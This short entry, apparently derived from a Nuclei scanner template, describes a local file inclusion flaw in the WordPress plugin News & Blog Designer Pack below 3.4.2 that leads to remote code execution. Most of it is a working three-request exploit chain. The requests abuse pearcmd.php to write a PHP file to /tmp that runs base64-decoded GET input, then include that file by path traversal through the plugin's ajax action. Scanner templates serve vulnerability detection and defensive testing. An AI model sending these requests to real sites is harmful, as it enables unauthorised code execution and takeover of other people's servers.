# Vulnerability: News & Blog Designer Pack < 3.4.2 - Remote Code Execution
**Classification:** WORDPRESS
**Source:** Nuclei Template (`blog-designer-pack-rce.yaml`)

## Description
News & Blog Designer Pack contains a local file inclusion vulnerability via user controlled $design variable extracted by POST parameter 'shrt_param' leading to Remote Code Execution via pearcmd.php. The vulnerability occurs within bdp_get_more_post function inside file bdp-ajax-functions.php.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=bdp_get_more_post

POST /wp-admin/admin-ajax.php?+config-create+/&/<?=base64_decode($_GET[0])?>+/tmp/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

&action=bdp_get_more_post&shrt_param[design]=../../../../../../../../usr/local/lib/php/pearcmd

POST /wp-admin/admin-ajax.php?0={{marker}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

&action=bdp_get_more_post&shrt_param[design]=../../../../../../../../tmp/{{randstr}}
```

